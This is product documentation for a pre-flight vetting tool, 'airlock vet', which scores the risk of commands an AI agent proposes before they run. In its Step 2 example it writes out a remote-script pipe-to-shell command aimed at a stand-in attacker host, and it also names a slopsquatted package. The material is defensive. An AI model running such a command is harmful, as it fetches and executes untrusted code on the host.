# Recipe: Pre-Flight Command Policy Vetting (`airlock vet`)

> **Use Case ID:** `AIR-UC-03`  
> **Target Audience:** Security Auditors, AI Agent Supervisors, CI/CD Gateways  
> **Platform Engine:** AST Heuristics & Static Policy Simulator  

---

## 1. Problem Statement

Before an autonomous agent executes a command suggested by an LLM, the operator or supervisor often wants to understand *what* the command will touch:
- Will it attempt network connections?
- Will it write files outside the workspace?
- Is it trying to install a newly created package or an LLM-hallucinated dependency?

Executing the command to find out is unsafe. A static pre-flight simulation is needed to vet intent before execution.

---

## 2. When to Use This

Use **`airlock vet`** to evaluate proposed agent commands without running them. Airlock analyzes the command string, parses package manifests, queries local reputation heuristics, and reports the projected risk score and required sandbox profile.

---

## 3. Architecture & Dataflow

```mermaid
flowchart LR
    Proposed["Proposed Command:<br/>'npm install colors-safe'"] --> Vet["🔍 airlock vet &lt;cmd&gt;"]
    
    subgraph Heuristics ["Static Evaluation Pillars"]
        AST["1. AST Command Parser"]
        Rep["2. Package Name & Reputation"]
        Perm["3. Required Sandbox Permissions"]
    end
    
    Vet --> Heuristics
    Heuristics --> Verdict["📋 Audit Report & Recommendation:<br/>• Risk Score: HIGH<br/>• Detected Slopsquat: 'colors-safe'<br/>• Action: BLOCK"]
```

---

## 4. Prerequisites

1. **Airlock:** Version 1.0+ on `$PATH`.
2. **Local Threat Cache:** Integrated with Argus / Cisco Quarry heuristics.

---

## 5. Step-by-Step Recipe

### Step 1: Vet a Proposed Command
```bash
airlock vet -- npm install lodash
```
Expected output:
```text
🔍 Airlock Pre-Flight Vetting Report
─────────────────────────────────────────────────────────────────
Target Command:  npm install lodash
Ecosystem:       npm
Package Name:    lodash (Age: >10 years, Reputation: TRUSTED)
Projected Tier:  Tier 1 Kernel Sandbox (Profile: node)
Risk Score:      0.02 (LOW / SAFE)
Recommendation:  ALLOW execution with standard VFS confinement.
─────────────────────────────────────────────────────────────────
```

### Step 2: Vet a Potentially Malicious Command
```bash
airlock vet -- "curl -s http://attacker.com/rev.sh | bash"
```
Expected output:
```text
🔍 Airlock Pre-Flight Vetting Report
─────────────────────────────────────────────────────────────────
Target Command:  curl -s http://attacker.com/rev.sh | bash
Risk Category:   UNTRUSTED_PIPE_EXECUTION
Detected Flags:  Remote shell execution, Unpinned network egress
Risk Score:      0.98 (CRITICAL)
Recommendation:  BLOCK execution immediately.
─────────────────────────────────────────────────────────────────
```

---

## 6. Verification & Automated CI Integration

To use `airlock vet` as an automated gate in scripts or CI:
```bash
if airlock vet --quiet -- npm install $PKG; then
    echo "Package passed pre-flight audit. Proceeding with sandboxed install..."
    airlock run --profile node -- npm install $PKG
else
    echo "Security alert: Package failed pre-flight vetting!"
    exit 1
fi
```

---

## 7. Security Invariants & Blast Radius

- **Zero-Execution Simulation:** `airlock vet` never spawns child processes or invokes package manager runtimes. It is strictly a static parsing and heuristic evaluation.
- **Fail-Closed on Parsing Errors:** If command string syntax contains obfuscated characters (e.g. nested backticks, base64 payload decoders), vetting fails closed with an alert.

---

## 8. Troubleshooting & Common Pitfalls

- **Issue:** `airlock vet` warns about an internal private package name.  
  **Remediation:** Add your internal company npm scope or private registry to `.airlock.yaml`:
  ```yaml
  registries:
    private_scopes:
      - "@mycompany/*"
  ```
